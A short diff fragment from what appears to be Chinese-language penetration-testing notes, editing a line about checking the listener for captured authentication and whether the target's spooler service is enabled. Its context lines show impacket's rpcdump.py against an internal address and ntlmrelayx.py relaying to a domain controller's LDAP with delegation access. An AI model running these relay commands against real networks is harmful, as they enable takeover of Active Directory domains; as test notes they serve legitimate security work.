@@ -24,4 +24,4 @@ rpcdump.py ncacn_ip_tcp:192.168.1.10
 ntlmrelayx.py -t ldap://dc01.domain.local --delegate-access
 ```
 
-小记录：测试时要同时看监听端是否收到认证，并记录目标服务是否启用 spooler。
+测试时要同时看监听端是否收到认证，并记录目标服务是否启用 spooler。
